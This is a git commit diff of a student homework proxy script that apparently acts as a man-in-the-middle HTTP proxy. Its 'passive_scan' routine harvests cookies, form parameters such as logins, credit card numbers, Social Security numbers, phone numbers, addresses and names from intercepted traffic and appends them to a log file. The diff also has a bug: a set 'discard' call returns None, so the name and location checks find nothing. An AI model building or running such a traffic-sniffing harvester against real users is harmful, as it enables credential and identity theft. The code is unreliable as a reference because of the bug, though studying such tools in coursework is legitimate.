7d7ce390c0c51e811ad0b6d210808ca700e2fa48
kevin <kevinjcord@gmail.com>
2023-11-15 02:09:42 -0600

    finished part 1

--- Homework_4/proxy.py
+++ Homework_4/proxy.py
@@ -4,11 +4,13 @@ import socket
 import select
 import threading
 from email.parser import BytesParser
+import time
 from urllib.parse import parse_qs, urlparse
 from termcolor import colored, cprint
 from pprint import pprint
 import nltk
 from nltk.corpus import names, gazetteers
+import traceback
 
 ############################################################################################################# Helper Functions
 nltk.download('names')
@@ -21,7 +23,7 @@ def identify_common_thing(input_string, thing):
     input_string = re.split('[^a-zA-Z]', input_string)
 
     words_in_input = {x for x in input_string}
-    common_thing_found = common_thing.intersection(words_in_input)
+    common_thing_found = common_thing.intersection(words_in_input).discard("Cookie")
 
     return common_thing_found
 
@@ -69,46 +71,70 @@ def full_receive(socket):
 def passive_scan(data):
     header, request_line = parse_http_headers(data)
     headers, body = data.split(b"\r\n\r\n", 1)
-    method, url, protocol = request_line.split()
-    parsed_url = urlparse(url)
-    
-    print(data)
-    # cookie
-    print(header["Cookie"]) 
-    # username / email / password
-    pprint(parse_qs(parsed_url.query.decode('utf-8')) or parse_qs(body.decode('utf-8')))
-    # cc ssn
-    cc_pattern = r'(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})'
-    cc_matches = re.findall(cc_pattern, str(data))
-    print(cc_matches)
+    method, url, *protocol = request_line.split()
+    data = str(data)
 
+    intel = {}
+
+    if method == b"GET" or method == b"POST":
+        parsed_url = urlparse(url)
+        # form parameters
+        form_data = parse_qs(parsed_url.query.decode('utf-8')) or parse_qs(body.decode('utf-8'))
+        if form_data != {}:
+            intel["form-data"] = form_data
+    
+    # cookies
+    if header["Cookie"] is not None:
+        intel["cookies"] = header["Cookie"]
+
+    # cc
+    cc_pattern = r'(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})'
+    cc_match = re.findall(cc_pattern, data) or None
+    if cc_match is not None:
+        intel["possible_CCs"] = cc_match
+
+    # ssn
     ssn_pattern = r'(\d{3}-\d{2}-\d{4}|XXX-XX-XXXX)'
-    ssn_matches = re.findall(ssn_pattern, str(data))
-    print(ssn_matches)
+    ssn_match = re.findall(ssn_pattern, data) or None
+    if ssn_match is not None:
+        intel["possible_SSNs"] = ssn_match
 
     # phone numbers
     phone_pattern = r'\b\d{3}-\d{3}-\d{4}\b'
-    phone_matches = re.findall(phone_pattern, str(data))
-    print(phone_matches)
+    phone_match = re.findall(phone_pattern, data) or None
+    if phone_match is not None:
+        intel["possible_phone #s"] = phone_match
 
+    # zipcode
     zipcode_pattern = r'\b\d{5}(?:-\d{4})?\b'
-    zipcode_matches = re.findall(zipcode_pattern, str(data))
-    print(zipcode_matches)
+    zip_match = re.findall(zipcode_pattern, data) or None
+    if zip_match is not None:
+        intel["possible_zipcodess"] = zip_match
 
+    # address
     address_pattern = r'\b(\d+\s*[+\s]+[\w\s]*[+\s](?:Street|St\.?|Avenue|Ave\.?|Boulevard|Blvd\.?|Road|Rd\.?|Lane|Ln\.?|Drive|Dr\.?|Court|Ct\.?|Place|Pl\.?))\b'
-    address_matches = re.findall(address_pattern, str(data))
-    print(address_matches)
+    addr_match = [word.replace('+', ' ') for word in re.findall(address_pattern, data)] or None
+    if addr_match is not None:
+        intel["possible_addresses"] = addr_match
 
     # common names
-    print(identify_common_thing(str(data), names))
+    common_names = identify_common_thing(data, names) or None 
+    if common_names is not None:
+        intel["possible_names"] = common_names
 
     # common cities
-    print(identify_common_thing(str(data), gazetteers))
+    locations = identify_common_thing(data, gazetteers) or None
+    if locations is not None:
+        intel["possible_locations"] = locations
 
+    if intel != {}:
+        intel["date"] = time.time()
+        pprint(intel)   
 
+        with open('info_1.txt', 'a+') as file:
+            pprint(intel, stream=file)   
 
-    
-    
+        
 
 
 def handle_client(client_socket, addr, listen_mode):
@@ -140,8 +166,10 @@ def handle_client(client_socket, addr, listen_mode):
             if not target_data:
                 break
 
-            # print(colored(f"[*] Packet from {hostname.decode('utf-8')}:{port}", 'red'))
+            print(colored(f"[*] Packet from {hostname.decode('utf-8')}:{port}", 'red'))
             # print(target_data)
+            if listen_mode == 'passive':
+                passive_scan(target_data)
 
             # send target data
             client_socket.send(target_data)
@@ -160,8 +188,9 @@ def handle_client(client_socket, addr, listen_mode):
         # Close the connections
         client_socket.close()
         target_socket.close()
-    except Exception as e:
-        print(e)
+    except Exception:
+        print("error")
+        # traceback.print_exc()
     
 
 def start_proxy(listen_mode, bind_host, bind_port):
